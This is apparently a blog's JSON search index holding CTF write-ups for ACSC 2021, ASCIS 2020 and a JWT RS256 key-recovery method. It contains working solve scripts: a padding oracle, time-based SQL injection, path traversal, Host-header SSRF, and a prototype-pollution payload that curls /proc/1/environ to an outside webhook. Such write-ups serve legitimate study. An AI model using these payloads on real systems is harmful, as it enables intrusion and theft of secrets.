[{"authors":null,"categories":null,"content":"General Kenobi A wannabe hacker lmao. Currently enjoying CTFs a lot, but have no idea how/where to start with real-world stuff.\n","date":-62135596800,"expirydate":-62135596800,"kind":"term","lang":"en","lastmod":-62135596800,"objectID":"2525497d367e79493fd32b198b28f040","permalink":"","publishdate":"0001-01-01T00:00:00Z","relpermalink":"","section":"authors","summary":"General Kenobi A wannabe hacker lmao. Currently enjoying CTFs a lot, but have no idea how/where to start with real-world stuff.","tags":null,"title":"Lam Nguyen","type":"authors"},{"authors":null,"categories":null,"content":"I competed in ACSC 2021 and got #16 (#2 VN). I overkilled did web and crypto, and here are the writeups.\nTable of Contents   Crypto\n1.1. RSA Stream\n1.2. CBCBC\n1.3. Secret Saver\n1.4. Swap on Curve\n1.5. Two Rabin\n  Web\n2.1. API\n2.2. Favorite Emojis\n2.3. Cowsay as a Service\n  Crypto The function small_roots below are from https://github.com/defund/coppersmith/blob/master/coppersmith.sage\nRSA Stream We are given $m^{65537}$ and $m^{65539}$ and we need to compute $m$. Here\u0026rsquo;s the firsts overkill:\n I first computed $m^2 = (\\text{flag} \\cdot 256^{255 - 97} + \\text{pad})^2$. $\\text{flag}$ has length $97 \u0026lt; \\frac{256}{2}$ so I use Coppersmith to solve the equation above.  from Crypto.Util.number import isPrime, bytes_to_long, long_to_bytes, inverse from Crypto.Util.Padding import pad n = 30004084769852356813752671105440339608383648259855991408799224369989221653141334011858388637782175392790629156827256797420595802457583565986882788667881921499468599322171673433298609987641468458633972069634856384101309327514278697390639738321868622386439249269795058985584353709739777081110979765232599757976759602245965314332404529910828253037394397471102918877473504943490285635862702543408002577628022054766664695619542702081689509713681170425764579507127909155563775027797744930354455708003402706090094588522963730499563711811899945647475596034599946875728770617584380135377604299815872040514361551864698426189453 e = 65537 f = open(\u0026quot;chal.py\u0026quot;, \u0026quot;rb\u0026quot;).read() ct = open(\u0026quot;chal.enc\u0026quot;, \u0026quot;rb\u0026quot;).read() em = [] for a in range(0, len(f), 256): q = f[a:a+256] if len(q) \u0026lt; 256: q = pad(q, 256) q = bytes_to_long(q) c = bytes_to_long(ct[a:a + 256]) stream = c ^^ q em.append(stream) flag_len = 97 m2 = em[1] * inverse(em[0], n) % n m = b\u0026quot;ASCS{}\u0026quot; m = pad(m, 255) m = bytes_to_long(m) padding = b\u0026quot;\\0\u0026quot; * flag_len padding = bytes_to_long(pad(padding, 255)) R = Integers(n) P.\u0026lt;x\u0026gt; = PolynomialRing(R, 1) F = (x * 256^(255 - flag_len) + padding)^2 - m2 m = small_roots(F, (256^flag_len,), m=4, d=4)[0][0] print(long_to_bytes(m))  CBCBC It\u0026rsquo;s a simple padding oracle. We can use iv1 to recover first block, and iv2 to recover second block and that is enough to recover the hidden_username.\nfrom base64 import b64encode, b64decode from string import printable from pwn import process, remote with process([\u0026quot;python3\u0026quot;, \u0026quot;chal.py\u0026quot;]) as tube: # with remote(\u0026quot;cbcbc.chal.acsc.asia\u0026quot;, 52171) as tube: print(tube.recvuntil(b\u0026quot;=====================================================\u0026quot;).decode()) print(tube.recvuntil(b\u0026quot;3. Exit\u0026quot;).decode()) tube.recv() tube.sendline(b\u0026quot;1\u0026quot;) tube.recv() tube.sendline(b\u0026quot;\u0026quot;) tube.recvline() target_token = b64decode(tube.recvline().strip()) print(\u0026quot;Target token\u0026quot;, target_token) iv1 = target_token[:16] iv2 = target_token[16:32] enc = target_token[32:] enc = enc[:16] fail_msg = b\u0026quot;Failed to login! Check your token again\u0026quot; def query(iv1: bytes, iv2: bytes, enc: bytes) -\u0026gt; bool: token = iv1 + iv2 + enc token = b64encode(token) tube.recvuntil(b\u0026quot;3. Exit\u0026quot;) tube.sendline(b\u0026quot;2\u0026quot;) tube.recv() tube.sendline(b\u0026quot;mugi\u0026quot;) tube.recv() tube.sendline(token) res = tube.recvline() return fail_msg not in res ans = bytearray(b\u0026quot;\\0\u0026quot; * 16) for i in range(15, -1, -1): for c in range(256): if chr(c ^ (16 - i)) not in printable: continue new_iv1 = bytearray(iv1) new_iv1[i] ^= c for j in range(i + 1, 16): new_iv1[j] ^= (16 - i) ^ ans[j] if query(new_iv1, iv2, enc): ans[i] = (c ^ (16 - i)) break print(ans)  Secret Saver I remember a similar challenge from CryptoHack. The main idea is to submit the payload repeated a few times. If the payload is correct, the compressed data should have the shortest length among all the candidates. From there we can iterate over each character and get the flag.\nThe problem here is how to get the compressed length. I used time-based SQLi to binary search the length. For the first candidate, I search on the whole range $(0-1000)$, suppose its length is $x$, then for the rest I search on range $(x - 10, x + 10)$.\nimport requests from string import ascii_letters, digits charset = [ \u0026quot;_\u0026lt;\u0026gt;?!+;:.}\u0026quot;, digits, ascii_letters, ] charset = \u0026quot;\u0026quot;.join(charset) url = \u0026quot;http://167.99.77.49/\u0026quot; thres = 0.3 def query(msg: str, vl = 0, vr = 1000) -\u0026gt; int: l = vl r = vr f = -1 while l \u0026lt;= r: mid = (l + r) // 2 res = requests.post(url, data={ \u0026quot;name\u0026quot;: f\u0026quot;' || (case when {str(mid).zfill(4)} \u0026lt;= char_length(msg) then sleep({thres}) else '' end) || '\u0026quot;, \u0026quot;msg\u0026quot;: msg * 20 }) print(res.elapsed.total_seconds()) if res.elapsed.total_seconds() \u0026gt; thres: f = mid l = mid + 1 else: r = mid - 1 return f ans = \u0026quot;ACSC{MAK3-CRiME-4TT4CK-GREAT-AGaiN!}\u0026quot; for i in range(10): len_list = [] vl = 0 vr = 1000 for p in range(len(charset)): c = charset[p] len_list.append(query(ans + c, vl, vr)) print(len_list[-1], c) if p == 0: vl = len_list[-1] - 10 vr = len_list[-1] + 10 if len_list[-1] \u0026lt; len_list[0]: break min_len = min(len_list) for p in range(len(charset)): if min_len != len_list[p]: continue c = charset[p] ans += c break print(ans)  This solution took a lot of time to run and it\u0026rsquo;s extremely inconsistent. Luckily the flag is easy to guess so I could know early when the code fails. Also I can edit the charset to catch the target character quicker.\nAfter the contest, I learned of a way to use updatexml to throw error with query value (http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html).\nSwap on Curve I did some simple transformations to create a univariate polynomial on $x$.\n\\begin{equation} \\begin{aligned} x^2 \u0026amp;= y^3 + ay + b \\\\\n\\Leftrightarrow x^2 - b \u0026amp;= y^3 + ay \\\\\n\\Rightarrow (x^2 - b)^2 \u0026amp;= (y^3 + ay)^2 \\\\\n\\Leftrightarrow (x^2 - b)^2 \u0026amp;= y^6 + a^2 y^2 + 2ay^4 \\\\\n\\Leftrightarrow (x^2 - b)^2 \u0026amp;= (x^3 + ax + b)^3 + a^2 (x^3 + ax + b) + 2a(x^3 + ax + b)^2 \\end{aligned} \\end{equation}\nNo idea how .roots() solved this, but it did.\nfrom Crypto.Util.number import long_to_bytes p = 10224339405907703092027271021531545025590069329651203467716750905186360905870976608482239954157859974243721027388367833391620238905205324488863654155905507 a = 4497571717921592398955060922592201381291364158316041225609739861880668012419104521771916052114951221663782888917019515720822797673629101617287519628798278 b = 1147822627440179166862874039888124662334972701778333205963385274435770863246836847305423006003688412952676893584685957117091707234660746455918810395379096 EC = EllipticCurve(GF(p), [a, b]) P.\u0026lt;x\u0026gt; = PolynomialRing(GF(p)) Y2 = x^3 + a * x + b F = (x^2 - b)^2 - (Y2^3 + a^2 * Y2 + 2 * a * Y2^2) cand = [] for x, _ in F.roots(): y2 = Y2(x) y = y2.sqrt() cand.append(x) cand.append(y) cand.append(-y) for x in cand: f = long_to_bytes(int(x)) if b\u0026quot;ACSC\u0026quot; in f: print(f)  Two Rabin The first part is trivial Coppersmith. For the second part, apply Coppersmith short-pad.\nThe code below is taken from http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/\nflag1_len = 98 n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099 B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471 c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396 c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862 flag2_len = 98 hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389 hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094 PRxy.\u0026lt;x,y\u0026gt; = PolynomialRing(Zmod(n)) PRx.\u0026lt;xn\u0026gt; = PolynomialRing(Zmod(n)) PRZZ.\u0026lt;xz,yz\u0026gt; = PolynomialRing(Zmod(n)) g1 = x * (x + B) - hard_c1 g2 = (x + y) * (x + y + B) - hard_c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() # x is hopefully eliminated h = h.change_ring(PRx).subs(y=xn) h = h.monic() print(h) roots = h.small_roots(X=2^240, epsilon=0.02) print(roots)  from Crypto.Util.number import long_to_bytes flag1_len = 98 flag1_len = 98 n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099 B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471 c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396 c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862 flag2_len = 98 hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389 hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094 y = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003324807101635213925825667932900258849901826251288979045274120411473033890824 R = Integers(n) P.\u0026lt;x\u0026gt; = PolynomialRing(R) g1 = x * (x + B) - hard_c1 g2 = (x + y) * (x + y + B) - hard_c2 while g2: g1, g2 = g2, g1 % g2 g1 = g1.monic() m1 = -g1[0] m2 = m1 + y print(long_to_bytes(int(m2) // (2^240)))  Web API The server does not abort after \u0026ldquo;redirecting\u0026rdquo;, so the admin code is still run. The exploit is as follow:\n  Register account:\nMugi/A123123123    Get passcode:\nid=Mugi\u0026amp;pw=A123123123\u0026amp;c=i\u0026amp;c2=gp    Get flag\nid=Mugi\u0026amp;pw=A123123123\u0026amp;c=i\u0026amp;c2=gd\u0026amp;pas=:\u0026lt;vNk\u0026amp;db=../../../../../flag    Favorite Emojis  First, add a query _escaped_fragment_=1 to the URL to get to the renderer route. Second, my URL is modified to be $host$request_uri. $host is taken from the Host header in the HTTP request.  I tried Host: api:8000 but it strips the port So I ngrok a local HTTP server that contains a HTML file test.html that does location = http://api:8000. The ngrok URL does not contain a port so it isn\u0026rsquo;t stripped.   Final payload: GET /test.html?_escaped_fragment_=1 HTTP/1.1 Host: f697-1-52-54-122.ngrok.io    Cowsay as a Service It has an obvious prototype pollution vuln. To exploit it, set username to __proto__, then call the /setting endpoint.\nAnother overkill incoming.\nI polluted the following:\nshell = \u0026quot;/usr/local/bin/node\u0026quot;; env = { NODE_OPTIONS: \u0026quot;--require /proc/self/environ\u0026quot;, payload: 'require(\u0026quot;child_process\u0026quot;).execSync(\\'curl -d \u0026quot;$(cat /proc/1/environ)\u0026quot; webhook\\');//', };  Run the /cowsay route and the server will execute the payload and we got the flag.\nSome 2meirl4meirl thoughts \u0026gt; still have an irrational fear of Java. \u0026gt; could not solve the 1 non-Java challenge left. \u0026gt; could not solve all the non-lattice challenges. \u0026gt; what the hell is lattice? \u0026gt; why do I overkill so much? \u0026gt; pain \u0026gt; anyway, hi Greece  ","date":1632009600,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1632009600,"objectID":"ae78900d75093dc47d2678306867f837","permalink":"https://lamnhh.github.io/post/2021-09-20-acsc2021/","publishdate":"2021-09-19T00:00:00Z","relpermalink":"/post/2021-09-20-acsc2021/","section":"post","summary":"I competed in ACSC 2021 and got #16 (#2 VN). I overkilled did web and crypto, and here are the writeups.\nTable of Contents   Crypto\n1.1. RSA Stream","tags":["ctf","crypto"],"title":"ACSC 2021 writeups","type":"post"},{"authors":null,"categories":null,"content":"Scenario A web server uses RS256 algorithm for their JWT signing. Both public key and private key are unknown. The adversary can query the server to sign a chosen message. The goal is to recover the public key.\nHow JWT works Take a look at a sample JWT:\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0.jv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg  It consists of 3 parts:\nHeader:\neyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9  Payload:\neyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0  Signature:\njv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg  Each of these part is base64-ed. The signature is computed on Header + \u0026quot;.\u0026quot; + Payload. The signing algorithm is specified in the raw header (in the sample above, it\u0026rsquo;s RS256 - RSA with SHA256).\nHow RS256 works RS256 - RSA with SHA256 does the following:\n Encode the message using EMSA-PKCS1-v1_5 (RFC3447, section9.2) with SHA256 as the hash function Perform textbook RSA signing on the encoded message  More detail on the RSA part Given the key $(N, e, d)$, the signature for message $m$ is computed as:\n$$s = m^d \\pmod{N}$$\nTo verify the signature, check if:\n$$ \\begin{equation} s^e \\equiv m^{de} \\equiv m \\pmod{N} \\label{eq:sample} \\tag{*} \\end{equation} $$\nThe attack From $(*)$, we can see that:\n$$s^e - m \\equiv 0 \\pmod{N}$$\nGiven a lot of $(message, signature)$ pairs $(m_1, s_1), (m_2, s_2), \u0026hellip;, (m_k, s_k)$, with high chance, we will get $N$ when we compute:\n$$GCD(s_1^e - m_1, s_2^e - m_2, \u0026hellip;, s_k^e - m_k)$$\nWhere does e come from? $e$ is usually in the form $2^{2^k} + 1$ with small $k$. We can bruteforce $e$.\nWhen can this attack be fatal? When the server uses a JWT library that is vulnerable to key confusion (can use RSA key to decode HS256 tokens), for example, CVE-2016-10555 or CVE-2017-11424.\nIn those cases, the attacker can modify the alg field to HS256 in the header, change the payload however they want, then sign it with the public key with HS256 algorithm. The server will decode the token using the public key, thus giving the attacker authentication.\nNotes about implementation JWT keys are usually large (at least 2048 bit long). Computing $s^e$ can be very slow. For Python, use mpz from gmpy2 to speed up things.\nSample implementation (writeup for the Cr0wnAir challenge (the crypto part) from UnionCTF 2021):\nfrom Crypto.Signature import PKCS1_v1_5 from Crypto.PublicKey import RSA from Crypto.Hash import SHA256 from Crypto.Util.number import bytes_to_long, long_to_bytes from base64 import b64decode, urlsafe_b64decode from gmpy2 import gcd, mpz target_bit_length = 2048 jwt_list = [ \u0026quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM0In0.jv953fHSWqvR7SY8l3g2ku_BRAXqIvKOIq_lAjPXWXgUeIml6myJeRmqoSkDZ3-YpyyQ2hQxTuBip8igyhOHz0dc6A08Psip1KuqVjnilywN1JcH0euXGVQeeI-FwdeIArPwfoDUFXXKz8sh3EO9gK6dAwmWGLAV4wMF50fVjb7WuHEiL6w9WOeKfBneV4_3skDm8ljXoGGGyP7YkL6ez-fwacIe7_m-4MuQdfZfO1t-g2Vjr-yaImUHrZyW9Q8cAM3eJZ7m0UCnb8pG5yd8rU5vcXovKrbX6ZIYwaw4-IvFtJdU6h2jXwm2uKjRnhfYezi_iKARFO2Mv3vJmkX-Kg\u0026quot;, \u0026quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQxMjM1In0.vtp96NW_PxO-_GW2e1u0xu4FTMYjYgwfe2wYKuksUGE_lM1ZeiyitDiUMXaQ3s5T3pD9ALHcqpsBY-5z1DbxVgPMvrqaExnw0merTDm17ku3b0ys5-dJOybb0meI7eu4i-Qykh0X_XHyOlxT6H-ZyxCcKov9sbnJVk3fbZY2lzjKuYZAIYQzXd5J65GooA7vkR2cWeK6rypHFyDPtuFaPLOhE6cLbC9VVyD4oxu0bvkpW6lRuiQni-S4uMkH2y7OUA16nNNVVwixUGVPwzGW8oS61lXiA3OHp1o336cyKJ9B4_ae1FeClPgUAnH_CWQIoZzco2Jb3mnHFq7lVgBnug\u0026quot;, ] def b64urldecode(b64: str) -\u0026gt; str: return urlsafe_b64decode(b64+(\u0026quot;=\u0026quot; * (len(b64) % 4))) def parse(jwt: str) -\u0026gt; (bytes, bytes): tokens = jwt.split(\u0026quot;.\u0026quot;) return \u0026quot;.\u0026quot;.join(tokens[0:2]), b64urldecode(tokens[2]) def get_rsa_mc(jwt: str) -\u0026gt; int: inp, sig = parse(jwt) h = SHA256.new(inp.encode()) m = bytes_to_long( PKCS1_v1_5.pkcs1_15._EMSA_PKCS1_V1_5_ENCODE(h, target_bit_length // 8) ) c = bytes_to_long(sig) return mpz(m), mpz(c) def get_pubkey(n: int, e: int) -\u0026gt; str: k = RSA.construct([n, e]) return k.export_key(\u0026quot;PEM\u0026quot;) ms = [] cs = [] for jwt in jwt_list: m, c = get_rsa_mc(jwt) ms.append(m) cs.append(c) assert len(ms) \u0026gt; 0 and len(cs) == len(ms) e = 65537 n = pow(cs[0], e) - ms[0] for i in range(1, len(ms)): m = ms[i] c = cs[i] n = gcd(n, pow(c, e) - m) for i in range(2, 1000): while n % i == 0: n //= i n = int(n) print(n) print(get_pubkey(n, e))  Lessons  Do not rely on public keys for security purposes. Be careful when using JWT. Or even better, don\u0026rsquo;t use them.  References  Abusing JWT public keys without the public key  ","date":1613952e3,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1613952e3,"objectID":"ec0159ed10e5cbc987a964fa80d4ae87","permalink":"https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/","publishdate":"2021-02-22T00:00:00Z","relpermalink":"/post/2021-02-22-jwt-rs256-recover-public-key/","section":"post","summary":"Scenario A web server uses RS256 algorithm for their JWT signing. Both public key and private key are unknown. The adversary can query the server to sign a chosen message. The goal is to recover the public key.","tags":["ctf","crypto"],"title":"Recover public keys from JWTs signed using RS256","type":"post"},{"authors":null,"categories":null,"content":"This is me upsolving the challenges 1 month after the contest. All patches are unavailable to download, so all I discuss here is how to attack the original challenges (with no patches).\nThe challenge can be summarised as:\n Given an oracle $E$ which we can query: give it a string $s$ and it will return $E(s)$. The target is to forge $E(target)$ where  $$target = \\text{0x2020202020202020202020202020202020202020202020202020202020202020}$$\n(32 bytes 0x20). The catch is that we cannot query for $E(target)$ directly.\nThere are 3 oracles we need to attack:\n AES-CBC 256 AES-GCM 256 RSA on Gaussian integers  AES-CBC 256    CBC Encryption  The oracle randomises its IV, requires the plaintext to be exactly 32 bytes long (2 blocks), which means it will feed into the cipher 3 blocks of data (because of padding). We have the exact flowchart as the image above.\nThe solution is:\n First, query $E(00 * 16 + 20 * 16)$, we get back $IV$ and $CT$. Second, compute $IV' = IV \\oplus (20 * 16)$. Submit $IV' + CT$ and get the flag.  Explanation: call the first block of plaintext $PT$. For our plaintext, we have $PT = 00 * 16$.\nWe can see that:\n$PT \\oplus IV = (PT \\oplus (20 * 16)) \\oplus (IV \\oplus (20 * 16)) = (target PT) \\oplus IV'$\nWhat this means is that using target PT and IV', we have the same first block of ciphertext as above. The rest blocks will subsequently be the same. Now we have the full ciphertext for $target$.\nAES-GCM 256    GCM encryption  GCM summarised: first encrypt the plaintext using CTR mode, then use ciphertext blocks as coefficients for a polynomial, compute it on a key-dependent point H, encrypt it, then return as an authentication tag.\nThis challenge is quite different from the other two. First, we look at the secret key initialisation:\nwith open(\u0026quot;/opt/flag/secret\u0026quot;, \u0026quot;rb\u0026quot;) as f: tp = Aes256GcmTP(f.read())  This means the secret key is the same over all connections.\nSecond, nonce initialisation:\n# this is the best way to avoid nonce reuse now = int(time()) if now \u0026lt;= self.last_timestamp: now = self.last_timestamp + 1 self.last_timestamp = now nonce = now.to_bytes(12, \u0026quot;big\u0026quot;)  This obviously can be bypassed using race condition.\nNow we have an GCM oracle that uses same secret key and same nonce for all queries. That means the encryption is a stream cipher with same key $\\Rightarrow$ we can forge ciphertext however we like.\nTo forge the authentication tag, we need to look more closely at the math. The tag is computed as follow:\n Compute $H = E(0^{128})$. Compute $pad = E(nonce | 0^{31} | 1)$. Call $c_1, c_2$ the two blocks of the ciphertext. The tag is: $c_1 \\cdot H^3 + c_2 \\cdot H^2 + (len(A) | len(C)) \\cdot H + pad$  Here we have $len(A) = 0, len(C) = 32 * 8 = 256$. All computation is on $GF(2^{128})$. This is a field, which means it has distributivity, a.k.a. $A(B+C) = AB + AC$. That means, consider 3 same-length ciphertext $c^1, c^2, c^3$, we have:\n$tag(c^1) + tag(c^2) + tag(c^3)$ $= (c^1_1 + c^2_1 + c^3_1) \\cdot H^3 + (c^1_2 + c^2_2 + c^3_2) \\cdot H_2 + (len(A) | len(C)) \\cdot H + pad$ $= tag(c^1 + c^2 + c^3) $\n(reminder that addition in $GF(2^n)$ is the XOR operation)\nDefine $et = E(target)$ (ciphertext for $target$). If we can forge these 3 values:\n c1 = et[:16] + 00 * 16 c2 = 00 * 16 + et[16:] c3 = 00 * 32  then we have $tag(c^1) + tag(c^2) + tag(c^3) = tag(c^1 + c^2 + c^3) = tag(E(target))$\nTo construct $c^1, c^2, c^3$ we do as follow:\n Define $p = random(32 bytes)$ Query $E(p)$. Compute $E(target) = E(p) \\oplus p \\oplus target$. Compute $p^1 = target \\oplus (E(target)[:16] | (00 * 16))$ Compute $p^2 = target \\oplus ((00 * 16) | E(target)[16:])$ Compute $p^3 = target \\oplus E(target)$  Then it\u0026rsquo;s easy to see that $E(p^i) = c^i$.\nRSA with Gaussian integers The string we submit is split into 2 halves, each converted to an integer, combined together into a Complex number. This complex number is then RSA-ed, concatenated, and returned to us.\nWe do not know $N$ and $e$.\nThe multiplication function is this:\ndef complex_mult(c1, c2, modulus): return Complex( (c1.re * c2.re - c1.im * c2.im) % modulus, # real part (c1.re * c2.im + c1.im * c2.re) % modulus, # image part )  We define $norm(a) = a.re^2 + a.im^2$.\nIt\u0026rsquo;s easy to see that $norm$ is multiplicative. In other word: $norm(c1 \\cdot c2) = norm(c1) \\cdot norm(c2)$. This means that we have:\n$norm(s)^e \\equiv norm(s^e) \\equiv norm(E(s))\\ (mod\\ N)$\nwhich is regular RSA.\nTo find $N$, we query 3 values: $E(2), E(4), E(8)$. We can see that:\n\\begin{equation} \\begin{aligned} E(2) \\cdot E(2) \u0026amp;\\equiv 2^e \\cdot 2^e \\\\\n\u0026amp;\\equiv 4^e \\\\\n\u0026amp;\\equiv E(4) \\pmod N \\\\\n\\Leftrightarrow E(2)^2 - E(4) \u0026amp;\\equiv 0\\ \\pmod N \\\\\n\\\\\nE(2) \\cdot E(2) \\cdot E(2) \u0026amp;\\equiv 2^e \\cdot 2^e \\cdot 2^e \\\\\n\u0026amp;\\equiv 8^e \\\\\n\u0026amp;\\equiv E(8) \\pmod N \\\\\n\\Leftrightarrow E(2)^3 - E(8) \u0026amp;\\equiv 0 \\pmod N \\end{aligned} \\end{equation}\nFrom that, we have:\n$$N \\mid GCD(E(2)^2 - E(4), E(2)^3 - E(8))$$\nDefine $g = GCD(E(2)^2 - E(4), E(2)^3 - E(8))$. By experiment, we can see that most prime factors of $g$ (except for $p, q$) is small (no greater than 1000). We now have $N$. Then I spent the next 12 hours struggling to compute $e$, only to realise that I don\u0026rsquo;t need it :(\nIt\u0026rsquo;s easy to see that:\n\\begin{equation} \\begin{aligned} E(2target) \u0026amp;\\equiv E(2) \\cdot E(target) \\pmod N \\\\\n\\Leftrightarrow E(target) \u0026amp;\\equiv E(2target) \\cdot E(2)^{-1} \\pmod N \\end{aligned} \\end{equation}\n$E(2)^{-1}\\ mod\\ N$ can be easily computed using extended Euclid alg (we already have $E(2)$ and $N$).\nDone.\n .medium-zoom-image { background-color: #fff; }  ","date":1610150400,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1610150400,"objectID":"76f11bf6053de94cf6cc1c37a9f191cb","permalink":"https://lamnhh.github.io/post/2021-01-09-ascis2020-crypto/","publishdate":"2021-01-09T00:00:00Z","relpermalink":"/post/2021-01-09-ascis2020-crypto/","section":"post","summary":"This is me upsolving the challenges 1 month after the contest. All patches are unavailable to download, so all I discuss here is how to attack the original challenges (with no patches).","tags":["ascis","ascis2020","ctf","crypto"],"title":"ASCIS 2020 - Crypto writeups","type":"post"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"8576ec274c98b3831668a172fa632d80","permalink":"https://lamnhh.github.io/about/","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/about/","section":"","summary":"","tags":null,"title":"","type":"widget_page"},{"authors":null,"categories":null,"content":"","date":-62135596800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":-62135596800,"objectID":"f26b5133c34eec1aa0a09390a36c2ade","permalink":"https://lamnhh.github.io/admin/config.yml","publishdate":"0001-01-01T00:00:00Z","relpermalink":"/admin/config.yml","section":"","summary":"","tags":null,"title":"","type":"wowchemycms"}]